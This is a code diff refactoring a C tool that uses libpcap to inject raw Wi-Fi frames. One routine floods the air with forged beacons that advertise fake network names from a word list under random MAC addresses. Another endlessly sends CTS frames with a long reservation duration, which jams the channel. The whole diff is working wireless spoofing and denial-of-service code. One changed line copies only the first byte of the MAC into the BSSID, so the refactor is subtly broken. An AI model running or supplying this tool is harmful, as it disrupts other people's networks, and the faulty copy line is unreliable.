@@ -6,8 +6,7 @@
 #include <stdint.h>
 #include <pcap/pcap.h>
 #include <time.h>
-
-#define MTU 1500
+#include <linux/if_ether.h>
 
 struct __attribute__ ((__packed__)) radiotap {
 	uint8_t revision;
@@ -19,9 +18,9 @@ struct __attribute__ ((__packed__)) radiotap {
 struct __attribute__ ((__packed__)) wifi {
 	uint16_t type;
 	uint16_t duration;
-	uint8_t raddr[6];
-	uint8_t saddr[6];
-	uint8_t bssid[6];
+	uint8_t raddr[ETH_ALEN];
+	uint8_t saddr[ETH_ALEN];
+	uint8_t bssid[ETH_ALEN];
 	uint16_t fragment;
 };
 
@@ -42,7 +41,7 @@ struct __attribute__ ((__packed__)) cts {
 	uint8_t type;
 	uint8_t flags;
 	uint16_t duration;
-	uint8_t raddr[6];
+	uint8_t raddr[ETH_ALEN];
 };
 
 struct __attribute__ ((__packed__)) beacon {
@@ -52,7 +51,7 @@ struct __attribute__ ((__packed__)) beacon {
 	struct tlv essid;
 };
 
-char ** load_words(char *path, int *lines)
+static char ** load_words(char *path, int *lines)
 {
 	char **words = NULL;
 	char *filecont;
@@ -109,13 +108,23 @@ enum attack {
 	CTS
 };
 
-void beaconize(pcap_t *pcap, char *words[], int lines)
+static inline void randaddr(uint8_t *addr)
 {
-	char buf[MTU] = {0};
+	addr[0] = rand() & 0xfe;
+	addr[1] = rand();
+	addr[2] = rand();
+	addr[3] = rand();
+	addr[4] = rand();
+	addr[5] = rand();
+}
+
+static void beaconize(pcap_t *pcap, char *words[], int lines)
+{
+	char buf[ETH_FRAME_LEN] = {0};
 	struct beacon *template = (struct beacon *)buf;
 	template->radiotap.length = 0x0008;
 	template->wifi.type = 0x0080;
-	memset(template->wifi.raddr, 0xff, 6);
+	memset(template->wifi.raddr, 0xff, ETH_ALEN);
 	template->mgmt.timestamp = 0x21214489;
 	template->mgmt.interval = 0x0064;
 	template->mgmt.capabilities = 0x0401;
@@ -129,9 +138,8 @@ void beaconize(pcap_t *pcap, char *words[], int lines)
 			continue;
 
 		/* fake but valid mac address */
-		char mac[6] = {rand() & 0xfe, rand(), rand(), rand(), rand(), rand()};
-		memcpy(template->wifi.saddr, mac, 6);
-		memcpy(template->wifi.bssid, mac, 6);
+		randaddr(template->wifi.saddr);
+		*template->wifi.bssid = *template->wifi.saddr;
 		strcpy((char *)&template->essid.data, word);
 		template->essid.length = strlen(word);
 		if(!pcap_inject(pcap, template, sizeof(*template) + template->essid.length))
@@ -139,15 +147,15 @@ void beaconize(pcap_t *pcap, char *words[], int lines)
 	}
 }
 
-void ctsize(pcap_t *pcap)
+static void ctsize(pcap_t *pcap)
 {
-	struct cts cts = {0};
-	cts.radiotap.length = 0x0008;
-	cts.type = 0xc4;
-	cts.duration = 0x7d00;
+	struct cts cts = {
+		.radiotap.length = 0x0008,
+		.type = 0xc4,
+		.duration = 0x7d00
+	};
 	while(1) {
-		char mac[6] = {rand() & 0xfe, rand(), rand(), rand(), rand(), rand()};
-		memcpy(cts.raddr, mac, 6);
+		randaddr(cts.raddr);
 		if(!pcap_inject(pcap, &cts, sizeof(cts)))
 			exit(0);
 	}
